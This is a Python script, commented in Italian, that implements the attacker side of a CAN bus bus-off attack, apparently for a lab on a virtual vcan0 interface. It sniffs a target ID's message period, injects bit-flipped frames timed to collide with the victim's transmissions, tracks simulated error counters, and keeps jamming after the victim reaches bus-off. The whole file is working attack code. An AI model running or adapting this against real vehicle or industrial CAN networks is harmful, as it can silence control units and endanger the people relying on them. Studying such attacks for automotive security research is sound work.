import can
import time
import sys
import random

# --- CONFIGURAZIONE ---
CAN_INTERFACE = 'vcan0'
TARGET_ID = 0x123 
BUS_OFF_THRESHOLD = 256
TEC_PASSIVE_THRESHOLD = 128
SAMPLE_SIZE = 5 
INITIAL_TEC = 0
# ----------------------

# --- FUNZIONI PER LA MANIPOLAZIONE BIT (Non modificate) ---

def bytes_to_bitstring(data):
    """Converte un array di byte in una stringa binaria."""
    return ''.join(f'{b:08b}' for b in data)

def bitstring_to_bytes(bit_string):
    """Converte una stringa binaria in un array di byte."""
    data = bytearray()
    for i in range(0, len(bit_string), 8):
        data.append(int(bit_string[i:i+8], 2))
    return list(data)

def find_and_flip(data_bytes):
    """Trova il primo bit '1' (Recessivo) e lo flippa a '0' (Dominante)."""
    original_bit_string = bytes_to_bitstring(data_bytes)
    modified_bit_string = list(original_bit_string)
    flip_index = -1
    
    # Cerchiamo il primo '1' (Recessivo)
    for i in range(len(modified_bit_string)):
        if modified_bit_string[i] == '1':
            modified_bit_string[i] = '0' # Flip a Dominante (0)
            flip_index = i
            break
            
    if flip_index == -1:
        return data_bytes, -1 
        
    modified_bit_string = "".join(modified_bit_string)
    modified_bytes = bitstring_to_bytes(modified_bit_string)
    
    return modified_bytes, flip_index

# --- FUNZIONE PRINCIPALE DELL'ATTACCANTE ---

def start_attacker_dynamic_final_corrected():
    
    try:
        # receive_own_messages=False è CRUCIALE
        bus = can.interface.Bus(channel=CAN_INTERFACE, interface='socketcan', receive_own_messages=False)
        print(f"✅ [Attaccante] Connesso a {CAN_INTERFACE}.")
    except OSError as e:
        print(f"❌ [Attaccante] Errore di connessione: {e}")
        return

    # Variabili di stato
    victim_tec_sim = INITIAL_TEC
    adversary_tec_sim = INITIAL_TEC
    attack_counter = 0
    
    # Variabili per la stima del periodo
    timestamps = []
    estimated_period = 0.0
    last_sniff_time = time.time()

    # ==========================================================
    # --- FASE 1: STIMA SEQUENZIALE DELLA FREQUENZA (Sniffing) ---
    # ==========================================================
    print("\n🔍 [Attaccante] FASE 1: Stima sequenziale della frequenza della Vittima...")
    
    while len(timestamps) < SAMPLE_SIZE + 1:
        # Aspetta indefinitamente il messaggio della Vittima per lo sniffing
        msg = bus.recv(timeout=None) 
        
        if msg is not None and msg.arbitration_id == TARGET_ID:
            now = time.time()
            if len(timestamps) > 0:
                interval = now - timestamps[-1]
                print(f"   [Sniff] Rilevato ID {hex(TARGET_ID)}. Intervallo misurato: {interval:.3f}s")
            else:
                print(f"   [Sniff] Primo messaggio rilevato.")
            
            timestamps.append(now)

            if len(timestamps) >= 2:
                # Calcola la media dei periodi misurati finora
                estimated_period = (timestamps[-1] - timestamps[0]) / (len(timestamps) - 1)
                
    # Determina l'ultimo tempo di invio della Vittima per la sincronizzazione iniziale
    if timestamps:
        last_sniff_time = timestamps[-1]
    
    print(f"✅ [Attaccante] Stima completata. Periodo stimato (T): {estimated_period:.3f}s")
    if estimated_period < 0.01: estimated_period = 5.0

    # ==========================================================
    # --- FASE 2: ATTACCO CHIRURGICO REATTIVO (Sincronizzazione) ---
    # ==========================================================
    print(f"\n--- FASE 2: Attacco avviato con T = {estimated_period:.3f}s ---")
    
    while True: # Loop infinito per la persistenza
        
        # 1. ASCOLTO REATTIVO: Aspetta il prossimo messaggio della Vittima (il nostro segnale)
        # Calcola quando ci aspettiamo il prossimo messaggio, aggiungendo un piccolo buffer
        time_to_next_msg = last_sniff_time + estimated_period - time.time()
        
        if time_to_next_msg > 0:
            # Attendiamo fino a poco prima del messaggio atteso (lasciando un piccolo margine)
            time.sleep(time_to_next_msg - 0.005) 
            
        # Tenta di sniffare il messaggio nello slot critico
        reference_msg = bus.recv(timeout=0.01) 
        
        # 2. VERIFICA E PREPARAZIONE ALL'ATTACCO
        if reference_msg is not None and reference_msg.arbitration_id == TARGET_ID:
            # Rilevato il messaggio della Vittima (riferimento)
            last_sniff_time = time.time() # Aggiorna il tempo base per il prossimo ciclo
            
            # 3. LOGICA TEC SIMULATA
            if victim_tec_sim < BUS_OFF_THRESHOLD:
                # Aggiornamento TEC se la Vittima non è ancora in Bus Off
                if victim_tec_sim < TEC_PASSIVE_THRESHOLD:
                    victim_tec_change, adversary_tec_change = 8, 8
                    fase_desc = "Fase 1 (Active)"
                else:
                    victim_tec_change, adversary_tec_change = 7, -1 
                    fase_desc = "Fase 2 (Passive)"
                
                victim_tec_sim += victim_tec_change
                adversary_tec_sim += adversary_tec_change
                
                print(f"\n--- CICLO ATTACCANTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
                print(f"[{fase_desc}] TEC Sim: V={victim_tec_sim} ({victim_tec_change:+d}), A={adversary_tec_sim} ({adversary_tec_change:+d})")

                if adversary_tec_sim >= BUS_OFF_THRESHOLD:
                    print("🚨🚨 [Attaccante] BUS OFF RILEVATO! Interrompo l'attacco.")
                    break
            
            else:
                # VITTMA È IN BUS OFF TEORICO -> Modalità persistenza (continua a bloccare)
                print(f"\n--- CICLO PERSISTENTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
                print(f"🔥 [Persistenza] Vittima in Bus Off (TEC {victim_tec_sim}). Continuo a bloccare il canale...")
            
            
            # 4. MANIPOLAZIONE BIT CHIRURGICA
            modified_data, flip_index = find_and_flip(reference_msg.data)
            
            # 5. INIEZIONE DEL MESSAGGIO MALEVOLO MANIPOLATO
            if modified_data is not None:
                try:
                    msg_attack = can.Message(
                        arbitration_id=TARGET_ID,
                        data=modified_data, 
                        is_extended_id=False
                    )
                    bus.send(msg_attack)
                    if flip_index != -1:
                        print(f"💣 [Attaccante] Iniettato Bit Error al bit #{flip_index}.")
                    else:
                        print("⚠️ Impossibile flippare, Attaccante invia frame di blocco generico.")
                        bus.send(can.Message(arbitration_id=TARGET_ID, data=[0x00]*8, is_extended_id=False))
                    
                except can.CanError:
                    print("⚠️ Errore CAN durante l'invio. L'Attaccante potrebbe essere in stato di errore.")
                    pass 
            
            attack_counter += 1

        else:
            # 6. Nessun messaggio della Vittima trovato nello slot atteso (jitter o Vittima ferma)
            if victim_tec_sim >= BUS_OFF_THRESHOLD:
                # Se la Vittima è già in Bus Off Teorico, continuiamo a bloccare, anche senza sniff.
                print(f"\n--- CICLO PERSISTENTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
                print(f"🔥 [Persistenza] Vittima Bus Off. Iniezione di blocco generico.")
                bus.send(can.Message(arbitration_id=TARGET_ID, data=[0x00]*8, is_extended_id=False))
                attack_counter += 1
            else:
                print(f"\n--- CICLO SKIPPATO ({time.strftime('%H:%M:%S')}) ---")
                print("⚠️ Messaggio Vittima non rilevato. Riprovo al prossimo slot...")
                # Per risincronizzare, riutilizziamo il periodo stimato dal last_sniff_time conosciuto.
        
        # Aggiorna il tempo base di attacco per l'iterazione successiva (necessario anche se si salta)
        last_sniff_time = last_sniff_time + estimated_period

    bus.shutdown()
    print("\n🛑 [Attaccante] Disconnesso.")

if __name__ == '__main__':
    start_attacker_dynamic_final_corrected()
